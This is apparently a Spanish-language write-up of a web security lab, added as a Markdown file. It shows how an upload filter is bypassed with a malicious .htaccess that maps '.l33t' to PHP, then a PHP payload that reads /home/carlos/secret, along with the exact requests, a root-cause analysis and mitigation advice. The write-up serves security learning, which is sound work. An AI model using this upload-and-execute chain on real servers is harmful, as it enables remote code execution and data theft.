@@ -1,0 +1,315 @@
+# Arbitrary File Upload — Bypass de restricción de extensión mediante `.htaccess`
+
+## 1. Resumen
+
+La aplicación permite a los usuarios autenticados subir imágenes como avatar. Aunque inicialmente bloquea la subida de archivos con extensión `.php`, el servidor utiliza **Apache con `mod_php`** y permite cargar un archivo `.htaccess`.
+
+Mediante la subida de un `.htaccess` malicioso se modifica la configuración de Apache para que una extensión arbitraria (`.l33t`) sea interpretada como código PHP. Posteriormente se sube un archivo PHP con dicha extensión y se solicita directamente, provocando su ejecución en el servidor.
+
+El archivo PHP utilizado permite leer el fichero:
+
+```text
+/home/carlos/secret
+```
+
+y devolver su contenido en la respuesta HTTP.
+
+---
+
+## 2. Vulnerabilidad identificada
+
+**Tipo:** Arbitrary File Upload / Remote Code Execution
+
+**Causa:** Validación insuficiente de archivos subidos y posibilidad de cargar archivos `.htaccess` controlados por el usuario.
+
+**Impacto:** Ejecución remota de código PHP en el servidor y acceso a información sensible.
+
+**Severidad:** Crítica
+
+---
+
+## 3. Análisis inicial
+
+Después de iniciar sesión, se sube una imagen como avatar.
+
+En Burp Suite, dentro de:
+
+**Proxy → HTTP history**
+
+se observa que el avatar se recupera mediante:
+
+```http
+GET /files/avatars/images.jpeg HTTP/2
+```
+
+La respuesta muestra que el servidor utiliza Apache:
+
+```http
+Server: Apache/2.4.41 (Ubuntu)
+```
+
+Este detalle es importante porque permite investigar el comportamiento de archivos `.htaccess`.
+
+---
+
+## 4. Preparación del payload
+
+Se crea un archivo denominado:
+
+```text
+exploit.php
+```
+
+con el siguiente contenido:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+El objetivo del payload es leer el secreto almacenado en:
+
+```text
+/home/carlos/secret
+```
+
+e imprimirlo en la respuesta HTTP.
+
+Al intentar subir directamente `exploit.php`, la aplicación rechaza el archivo porque su extensión no está permitida.
+
+---
+
+## 5. Bypass mediante `.htaccess`
+
+En Burp Suite se intercepta la petición:
+
+```http
+POST /my-account/avatar HTTP/2
+```
+
+La parte correspondiente al archivo se modifica para cargar un archivo denominado:
+
+```text
+.htaccess
+```
+
+con:
+
+```http
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+```
+
+y como contenido:
+
+```apache
+AddType application/x-httpd-php .l33t
+```
+
+La directiva indica a Apache que los archivos cuya extensión sea `.l33t` deben tratarse como archivos PHP.
+
+La aplicación confirma:
+
+```text
+The file avatars/.htaccess has been uploaded.
+```
+
+Por tanto, la configuración maliciosa ha sido almacenada dentro del directorio de avatares.
+
+---
+
+## 6. Subida del payload con una extensión permitida
+
+A continuación se reutiliza la petición de subida y se modifica el nombre del archivo:
+
+```text
+exploit.php
+```
+
+por:
+
+```text
+exploit.l33t
+```
+
+El contenido sigue siendo:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+La aplicación acepta el archivo:
+
+```text
+The file avatars/exploit.l33t has been uploaded.
+```
+
+Esto es posible porque el archivo ya no utiliza la extensión `.php`, que estaba bloqueada.
+
+---
+
+## 7. Ejecución del payload
+
+Finalmente, en Burp Repeater se modifica la petición utilizada para recuperar el avatar:
+
+```http
+GET /files/avatars/images.jpeg HTTP/2
+```
+
+para solicitar:
+
+```http
+GET /files/avatars/exploit.l33t HTTP/2
+```
+
+Debido a la configuración introducida mediante `.htaccess`, Apache interpreta `exploit.l33t` como código PHP.
+
+Por tanto, en lugar de devolver el código fuente del archivo, el servidor ejecuta:
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+y devuelve en la respuesta HTTP el contenido del secreto de Carlos.
+
+---
+
+## 8. Cadena de explotación
+
+La explotación completa puede resumirse de la siguiente forma:
+
+```text
+Restricción de .php
+        ↓
+Identificación de Apache
+        ↓
+Subida de .htaccess
+        ↓
+AddType application/x-httpd-php .l33t
+        ↓
+Subida de exploit.l33t
+        ↓
+GET /files/avatars/exploit.l33t
+        ↓
+Apache interpreta .l33t como PHP
+        ↓
+Ejecución del payload
+        ↓
+Lectura de /home/carlos/secret
+        ↓
+Obtención del secreto
+```
+
+---
+
+## 9. Causa raíz
+
+El problema no consiste únicamente en que la aplicación permita subir determinados archivos.
+
+La vulnerabilidad aparece por la combinación de:
+
+1. Control insuficiente sobre los archivos que puede subir el usuario.
+2. Permiso para subir un archivo `.htaccess`.
+3. Posibilidad de modificar mediante `.htaccess` cómo Apache interpreta determinadas extensiones.
+4. Ejecución de PHP mediante `mod_php`.
+5. Ausencia de aislamiento entre los archivos subidos por los usuarios y el entorno ejecutable del servidor.
+
+El filtro que bloquea `.php` resulta insuficiente porque únicamente controla una extensión concreta, mientras que el atacante puede modificar la configuración del servidor para convertir otra extensión en ejecutable.
+
+---
+
+## 10. Impacto
+
+Un atacante autenticado podría utilizar esta vulnerabilidad para conseguir **ejecución remota de código (RCE)** en el servidor.
+
+Dependiendo de los privilegios del proceso web, esto podría permitir:
+
+* Leer archivos sensibles.
+* Obtener secretos y credenciales.
+* Acceder a información de otros usuarios.
+* Modificar archivos accesibles por el proceso web.
+* Ejecutar comandos o código con los privilegios del servidor web.
+* Utilizar el servidor como punto de apoyo para ataques posteriores.
+
+En el laboratorio, la explotación permitió leer:
+
+```text
+/home/carlos/secret
+```
+
+y obtener el secreto necesario para completar el laboratorio.
+
+---
+
+## 11. Recomendaciones de mitigación
+
+### Validación de archivos
+
+No confiar únicamente en la extensión o en el `Content-Type` proporcionado por el cliente.
+
+Se recomienda:
+
+* Validar realmente el contenido del archivo.
+* Utilizar una lista blanca de formatos permitidos.
+* Generar nombres de archivo aleatorios.
+* Ignorar completamente el nombre proporcionado por el usuario.
+
+### Impedir archivos de configuración
+
+Los usuarios no deberían poder subir archivos como:
+
+```text
+.htaccess
+```
+
+ni otros archivos de configuración que puedan modificar el comportamiento del servidor.
+
+### Separar almacenamiento y ejecución
+
+Los archivos subidos por los usuarios deberían almacenarse en un directorio donde el servidor web **no permita ejecución de código**.
+
+Idealmente:
+
+```text
+/uploads
+```
+
+debería utilizarse únicamente como almacenamiento estático.
+
+### Deshabilitar ejecución de scripts
+
+El directorio destinado a uploads debe configurarse para impedir la ejecución de PHP y otros lenguajes interpretados.
+
+### Defensa en profundidad
+
+No depender de una única comprobación como:
+
+```text
+.php → bloqueado
+```
+
+La aplicación debe asumir que el atacante puede intentar modificar:
+
+* extensión,
+* MIME type,
+* nombre de archivo,
+* rutas,
+* contenido,
+* archivos de configuración.
+
+---
+
+## 12. Conclusión
+
+El laboratorio demuestra cómo una restricción aparentemente efectiva sobre la subida de archivos puede ser evadida cuando el atacante tiene capacidad para modificar la configuración del servidor.
+
+El punto crítico fue identificar que el servidor utilizaba **Apache** y que era posible cargar `.htaccess`. La directiva:
+
+```apache
+AddType application/x-httpd-php .l33t
+```
+
+permitió convertir una extensión aparentemente inocua en una extensión ejecutable por PHP.
+
+La combinación de **arbitrary file upload + modificación de configuración + ejecución de PHP** permitió finalmente conseguir ejecución remota de código y acceder al secreto de Carlos.
+
+**Resultado:** laboratorio resuelto mediante ejecución de un archivo PHP utilizando una extensión personalizada configurada mediante `.htaccess`.
